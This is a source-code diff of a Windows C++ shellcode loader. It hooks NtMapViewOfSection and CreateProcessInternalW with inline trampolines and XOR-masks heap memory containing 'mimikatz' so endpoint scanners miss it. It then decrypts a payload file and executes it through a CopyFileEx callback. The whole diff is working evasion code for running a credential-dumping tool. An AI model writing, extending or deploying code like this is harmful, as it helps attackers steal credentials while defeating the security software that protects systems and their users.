@@ -193,27 +193,10 @@ char* encrypter_111(const char* path, BOOL isDecrypt, LPDWORD bytes, BOOL calcul
 
 }
 
-typedef struct {
-	char originalData[13];
-	char jmp_addr[8];
-} HOOK_RESULT, * PHOOK_RESULT, * LPHOOK_RESULT;
 
 
-LPHOOK_RESULT res = new HOOK_RESULT;
 
-typedef
-BOOL(WINAPI* PCreateProcessA)(
-	LPCSTR                lpApplicationName,
-	LPSTR                 lpCommandLine,
-	LPSECURITY_ATTRIBUTES lpProcessAttributes,
-	LPSECURITY_ATTRIBUTES lpThreadAttributes,
-	BOOL                  bInheritHandles,
-	DWORD                 dwCreationFlags,
-	LPVOID                lpEnvironment,
-	LPCSTR                lpCurrentDirectory,
-	LPSTARTUPINFOA        lpStartupInfo,
-	LPPROCESS_INFORMATION lpProcessInformation
-	);
+
 
 typedef
 BOOL(WINAPI* PCreateProcessInternalW)(
@@ -231,34 +214,23 @@ BOOL(WINAPI* PCreateProcessInternalW)(
 	PHANDLE hNewToken
 	);
 
-typedef struct {
-	LPBYTE signature;
-	SIZE_T sigSize;
-}SIGNATURE, * LPSIGNATURE, * PSIGNATURE;
 
-
-
-
-typedef struct {
-	PSIZE_T sigs;
-	SIZE_T size;
-}PATTERN_RESULT, * LPPATTERN_RESULT, * PPATTERN_RESULT;
-
-
+typedef NTSTATUS(NTAPI* myNtMapViewOfSection)  
+	(HANDLE SectionHandle, 
+	HANDLE ProcessHandle, 
+	PVOID* BaseAddress, 
+	ULONG_PTR ZeroBits, 
+	SIZE_T CommitSize, 
+	PLARGE_INTEGER SectionOffset, 
+	PSIZE_T ViewSize, 
+	DWORD InheritDisposition, 
+	ULONG AllocationType,
+	ULONG Win32Protect);
 
 
 
 
 
-/*
-*	Says when a area in the specified process matches the signature.
-*
-*	@param  a HANDLE to the process.
-*	@param  the baseAddress that the function will try to match.
-*	@param  the mask of the pattern.
-*	@param  a vector which contains the signature of the pattern.
-*	@return TRUE if the signature of the pattern matches the BYTES in the area in the memory specified by the @param address.
-*/
 
 
 
@@ -269,6 +241,13 @@ char tramp[13] = {
 	0x41, 0xFF, 0xE2                                                    // jmp r10
 };
 char tramp_old[13];
+
+char tramp2[13] = {
+	0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
+	0x41, 0xFF, 0xE2                                                    // jmp r10
+};
+char tramp2_old[13];
+
 
 BOOL restore_function(HANDLE hToken,
 	LPCWSTR lpApplicationName,
@@ -313,8 +292,85 @@ BOOL restore_function(HANDLE hToken,
 
 	return TRUE;
 }
-#define XOR_KEY "SAF341jlnvnjksd!$$%%$··";
 
+
+BOOL restore_ntmap(HANDLE SectionHandle,
+	HANDLE ProcessHandle,
+	PVOID* BaseAddress,
+	ULONG_PTR ZeroBits,
+	SIZE_T CommitSize,
+	PLARGE_INTEGER SectionOffset,
+	PSIZE_T ViewSize,
+	DWORD InheritDisposition,
+	ULONG AllocationType,
+	ULONG Win32Protect)
+{
+	printf("Restoring old Hooks\n");
+	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
+	myNtMapViewOfSection NtMap;
+	NtMap = (myNtMapViewOfSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
+	DWORD written2, written3;
+
+
+	VirtualProtect(NtMap, sizeof NtMap, PAGE_EXECUTE_READWRITE, &written2);
+	VirtualProtect(tramp2_old, sizeof tramp2_old, PAGE_EXECUTE_READWRITE, &written3);
+
+	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
+	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
+	if (!WriteProcessMemory(hProc, NtMap, &tramp2_old, sizeof tramp2_old, NULL))
+	{
+		printf("Error\n");
+		return FALSE;
+	}
+	printf("New information after overwrite is: @%I64X\n", NtMap);
+	NtMap(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
+	return 1;
+
+}
+
+
+BOOL restore_createprocess_hooks(
+	HANDLE hToken,
+	LPCWSTR lpApplicationName,
+	LPWSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCWSTR lpCurrentDirectory,
+	LPSTARTUPINFOW lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation,
+	PHANDLE hNewToken)
+{
+	restore_function(hToken,
+		lpApplicationName,
+		lpCommandLine,
+		lpProcessAttributes,
+		lpThreadAttributes,
+		bInheritHandles,
+		dwCreationFlags,
+		lpEnvironment,
+		lpCurrentDirectory,
+		lpStartupInfo,
+		lpProcessInformation,
+		hNewToken);
+	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
+	PCreateProcessInternalW CreateProcessInternalW, CreateProcessInternalW2;
+	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
+	DWORD written2;
+
+	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
+	DWORD old2;
+	VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
+	printf("Internal CreateProcess: %p", &CreateProcessInternalW);
+	if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
+	{
+		printf("Error\n");
+		return FALSE;
+	}
+	return TRUE;
+}
 
 BOOL WINAPI hook_CreateProcessA(
 	HANDLE hToken,
@@ -370,7 +426,8 @@ BOOL WINAPI hook_CreateProcessA(
 							}
 							if (strstr((char*)(ii), "MZE") != 0)
 								printf("Failed XOR\n");
-							restore_function(hToken,
+
+							if (restore_createprocess_hooks(hToken,
 								lpApplicationName,
 								lpCommandLine,
 								lpProcessAttributes,
@@ -381,8 +438,11 @@ BOOL WINAPI hook_CreateProcessA(
 								lpCurrentDirectory,
 								lpStartupInfo,
 								lpProcessInformation,
-								hNewToken);
-							Sleep(7000);
+								hNewToken) == FALSE)
+							{
+								printf("Error restoring createprocess hooks\n");
+								return 0;
+							}
 							for (auto ij = ii; ij < (__int64)entry.lpData + entry.cbData; ij += 0x01)
 							{
 								*(char*)ij = *(char*)ij ^ '5';
@@ -392,20 +452,7 @@ BOOL WINAPI hook_CreateProcessA(
 							if (strstr((char*)(ii), "MZE") != 0)
 								printf("Successfully decrypted XOR\n");
 							HANDLE hLoad = LoadLibrary("kernel32.dll");
-							HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
-							PCreateProcessInternalW CreateProcessInternalW, CreateProcessInternalW2;
-							CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
-							DWORD written2;
 
-							VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
-							DWORD old2;
-							VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
-							printf("Internal CreateProcess: %p", &CreateProcessInternalW);
-							if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
-							{
-								printf("Error\n");
-								exit(-1);
-							}
 							
 
 							return 1;
@@ -427,34 +474,164 @@ BOOL WINAPI hook_CreateProcessA(
 	return 1;
 }
 
-void null_function()
+
+
+__int64 aux, lpdata, cbdata;
+int iteration=0;
+
+
+BOOL restore_hook_image_notification(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect)
 {
-	printf("null1");
+	restore_ntmap(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
+	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
+	myNtMapViewOfSection NtMap;
+	NtMap = (myNtMapViewOfSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
+	DWORD written2;
+
+	VirtualProtect(NtMap, sizeof NtMap, PAGE_EXECUTE_READWRITE, &written2);
+	DWORD old2;
+	VirtualProtect(tramp2, sizeof tramp2, PAGE_EXECUTE_READWRITE, &old2);
+	printf("Internal CreateProcess: %p\n", &NtMap);
+	if (!WriteProcessMemory(hProc, (LPVOID*)NtMap, &tramp2, sizeof tramp2, NULL))
+	{
+		printf("Error\n");
+		return FALSE;
+	}
+	
+	return TRUE;
+
+}
+
+NTSTATUS null_function(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect)
+{
+	HANDLE hHeaps[250];
+	const char* mask = "MZE";
+	const char* key = "ASDFASF234124jklsf-4&%/&/";
+	size_t key_size = sizeof key;
+	DWORD numHeaps = GetProcessHeaps(250, hHeaps);
+	unsigned long i;
+	MEMORY_BASIC_INFORMATION mbi;
+	if (numHeaps <= 250)
+	{
+		for (i = 0; i < numHeaps; i++) {
+
+			HeapLock(hHeaps[i]);
+
+			PROCESS_HEAP_ENTRY entry;
+			memset(&entry, '\0', sizeof entry);
+
+			bool found = false;
+			char* allocable;
+			while (!found && HeapWalk(hHeaps[i], &entry) != FALSE)
+			{
+				for (auto ii = (__int64)entry.lpData; ii < (__int64)entry.lpData + entry.cbData; ii += 0x01) {
+
+					if (!VirtualQueryEx(GetCurrentProcess(), (LPCVOID*)ii, &mbi, sizeof MEMORY_BASIC_INFORMATION))
+						return 0;
+					if (mbi.Protect == PAGE_EXECUTE_READWRITE)
+					{
+						if (strstr((char*)(ii), "mimikatz") != 0)
+						{
+							iteration = 1;
+							aux = ii;
+							lpdata = (__int64)entry.lpData;
+							cbdata = entry.cbData;
+							printf("Data: %s\n", (char*)aux);
+
+							printf("Data dir: %p\n", aux);
+							DWORD old;
+							int keyIndex = 0;
+							for (auto ij = ii; ij < (__int64)entry.lpData + entry.cbData; ij += 0x01)
+							{
+								*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
+								keyIndex += 1;
+
+							}
+							printf("Key index: %d\n", keyIndex);
+							if (strstr((char*)(ii), "MZE") == 0)
+								printf("Successfully encrypted XOR\n");
+							DWORD old3;
+							
+							BOOL restore = restore_hook_image_notification(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
+							if (restore == FALSE)
+							{
+								printf("\nError restoring hooked functions\n");
+								return 0;
+							}
+							
+							keyIndex = 0;
+							for (auto ij = ii; ij < (__int64)entry.lpData + entry.cbData; ij += 0x01)
+							{
+								*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
+								keyIndex += 1;
+
+							}
+							//fwrite((char *)ii, (__int64)entry.lpData + entry.cbData, 1, fp);
+							if (strstr((char*)(ii), "MZE") != 0)
+								printf("Successfully decrypted XOR\n");
+
+
+							return 1;
+						}
+						if (iteration >= 1)
+						{
+							iteration += 1;
+							printf("In iteration: %d\n", iteration);
+							
+							DWORD old;
+							int keyIndex = 0;
+							for (auto ij = aux;  (__int64)ij < (__int64)lpdata + (__int64)cbdata; ij += 0x01)
+							{
+								*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
+								keyIndex += 1;
+
+							}
+							if (strstr((char*)(aux), "MZE") == 0)
+								printf("Successfully encrypted XOR\n");
+							DWORD old3;
+							BOOL restore = restore_hook_image_notification(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
+							if (restore == FALSE)
+							{
+								printf("\nError restoring hooked functions\n");
+								return 0;
+							}
+
+							keyIndex = 0;
+							for (auto ij = aux; (__int64)ij < (__int64)lpdata + (__int64)cbdata; ij += 0x01)
+							{
+								*(char*)ij = *(char*)ij ^ key[keyIndex % key_size];
+								keyIndex += 1;
+
+							}
+							if (strstr((char*)(aux), "MZE") == 0)
+								printf("Successfully decrypted XOR\n");
+
+
+							return 1;
+						
+						}
+					}
+
+					ZeroMemory(&mbi, sizeof MEMORY_BASIC_INFORMATION);
+				}
+			}
+			HeapUnlock(hHeaps[i]);
+		}
+	}
+
+
+	return 0;
 }
 
 
-int main() {
-	static DWORD size = NULL;
-	HOOK_RESULT* res;
-	encrypter_111("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", true, &size, true);
-	char* lloc = (char*)malloc(size);
-	memcpy(lloc, encrypter_111("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", true, &size, false), size);
-	DWORD fold = NULL, old = NULL;
-
-
-
-	HANDLE hLoad = LoadLibrary("kernel32.dll");
-	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
+BOOL hook_createprocess(HANDLE hProc)
+{
+	printf("\nHooking CreateProcessInternalW\n");
+	DWORD written2, written3;
 	PCreateProcessInternalW CreateProcessInternalW, CreateProcessInternalW2;
 	CreateProcessInternalW = (PCreateProcessInternalW)GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "CreateProcessInternalW");
-	
-	DWORD written2;
-
-	
 	VirtualProtect(CreateProcessInternalW, sizeof CreateProcessInternalW, PAGE_EXECUTE_READWRITE, &written2);
-
-	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
-	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
+	
 	printf("Tramp : 0x%p\n", &tramp);
 	puts("\n");
 	void* shit = (void*)hook_CreateProcessA;
@@ -462,20 +639,60 @@ int main() {
 	memcpy(&tramp[2], &shit, sizeof(shit));
 	printf("_hoot_trampoline@%I64X\n", hook_CreateProcessA);
 	printf("Old pointer@%I64X\n", tramp_old);
-	DWORD old2;
+	DWORD old2, old3;
 	VirtualProtect(tramp, sizeof tramp, PAGE_EXECUTE_READWRITE, &old2);
-	printf("Internal CreateProcess: %p", &CreateProcessInternalW);
 	if (!WriteProcessMemory(hProc, (LPVOID*)CreateProcessInternalW, &tramp, sizeof tramp, NULL))
 	{
 		printf("Error\n");
 		exit(-1);
 	}
-	
+}
+BOOL hook_ntmap(HANDLE hProc)
+{
+	printf("\nHooking NtMapViewOfSection\n");
+	myNtMapViewOfSection NtMap;
+	NtMap = (myNtMapViewOfSection)GetProcAddress(GetModuleHandle("NTDLL.dll"), "NtMapViewOfSection");
+	DWORD written2, written3;
+
+
+	VirtualProtect(NtMap, sizeof NtMap, PAGE_EXECUTE_READWRITE, &written3);
+
+	//WriteProcessMemory(hProc, &CreateProcessInternalW, &hook_CreateProcessA, sizeof CreateProcessInternalW, NULL);
+	//WriteProcessMemory(hProc, &CreateProcessInternalW2, &hook_CreateProcessA, sizeof CreateProcessInternalW2, NULL);
+	void* shit2 = (void*)null_function;
+
+
+	memcpy(tramp2_old, NtMap, sizeof tramp2_old);
+	memcpy(&tramp2[2], &shit2, sizeof shit2);
+
+	DWORD old2, old3;
+
+	VirtualProtect(tramp2, sizeof tramp2, PAGE_EXECUTE_READWRITE, &old3);
+
+
+	if (!WriteProcessMemory(hProc, (LPVOID*)NtMap, &tramp2, sizeof tramp2, NULL))
+	{
+		printf("Error\n");
+		exit(-1);
+	}
+}
+
+int main() {
+	static DWORD size = NULL;
+	encrypter_111("terminator.raw.ramon", true, &size, true);
+	char* lloc = (char*)malloc(size);
+	memcpy(lloc, encrypter_111("terminator.raw.ramon", true, &size, false), size);
+
+
+
+	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, NULL, GetCurrentProcessId());
+	hook_createprocess(hProc);
+	hook_ntmap(hProc);
 	DWORD dold = NULL;
 	if (!VirtualProtect(lloc, size, PAGE_EXECUTE_READWRITE, &dold))
 		return 0;
-	printf("Current process ID: %d\n", GetCurrentProcessId());
-	if (!CopyFileEx("C:\\Users\\edr1\\Documents\\Openssl-dev\\terminator.raw.ramon", "terminator.raw.ramon", (LPPROGRESS_ROUTINE)lloc, NULL, FALSE, 0))
+	printf("\nCurrent process ID: %d\n", GetCurrentProcessId());
+	if (!CopyFileEx("terminator.raw.ramon", "terminator2.raw.ramon", (LPPROGRESS_ROUTINE)lloc, NULL, FALSE, 0))
 		printf("Error: %d\n", GetLastError());
 
 
